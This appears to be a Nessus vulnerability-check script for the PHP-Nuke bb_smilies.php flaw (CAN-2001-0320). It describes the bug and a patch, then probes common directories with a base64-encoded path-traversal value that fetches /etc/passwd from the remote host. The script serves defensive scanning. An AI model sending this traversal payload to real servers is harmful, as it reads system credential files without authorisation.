if (description)
{
 script_id(10630);
 script_cve_id("CAN-2001-0320");
 script_version ("$Revision: 1.12 $");
 script_name(english:"PHP-Nuke security vulnerability (bb_smilies.php)");
 desc["english"] = "
The remote host seems to be vulnerable to a security problem in PHP-Nuke (bb_smilies.php). 
The vulnerability is caused by inadequate processing of queries by PHP-Nuke's bb_smilies.php 
which results in returning the content of any file we desire (the file needs to be world-readable).
A similar vulnerability in the same PHP program allows execution of arbitrary code by changing 
the password of the administrator of bb_smilies.

Impact:
Every file that the webserver has access to can be read by anyone. It is 
also possible to change bb_smilies' administrator password and even execute 
arbitrary commands.

Solution:
Change the following lines in both bb_smilies.php and bbcode_ref.php:

if ($userdata[9] != '') $themes = 'themes/$userdata[9]/theme.php';
else $themes = 'themes/$Default_Theme/theme.php';


To:

if ($userdata[9] != '') $themes = 'themes/$userdata[9]/theme.php';
else $themes = 'themes/$Default_Theme/theme.php';
if ( !(strstr(basename($themes),'theme.php')) || !(file_exists($themes)) ){
echo 'Invalid Theme'; exit;}
include ('$themes');


Or upgrade to the latest version (Version 4.4.1 and above).

Risk factor : Medium

Additional information:
http://www.securiteam.com/securitynews/Serious_security_hole_in_PHP-Nuke__bb_smilies_.html";

 script_description(english:desc["english"]);
 script_summary(english:"Determine if a remote host is vulnerable to the bb_smilies.php vulnerability");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 script_copyright(english:"This script is Copyright (C) 2001 SecuriTeam");
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");


function check(dir)
{
 data = http_get(item:string(dir, "/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK"), port:port);
 resultrecv = http_keepalive_send_recv(port:port, data:data);
 if(resultrecv == NULL)exit(0);
 if (egrep(pattern:".*root:.*:0:[01]:.*", string:resultrecv))
 {
  security_hole(port);
  exit(0);
 }
 return(0);
}


port = get_kb_item("Services/www");
if (!port) port = 80;
if(!get_port_state(port))exit(0);

check(dir:"/");
check(dir:"/phpBB");
check(dir:"/forum");
check(dir:"/phpbb");
check(dir:"/pages");
foreach dir (cgi_dirs())
{
check(dir:dir);
}


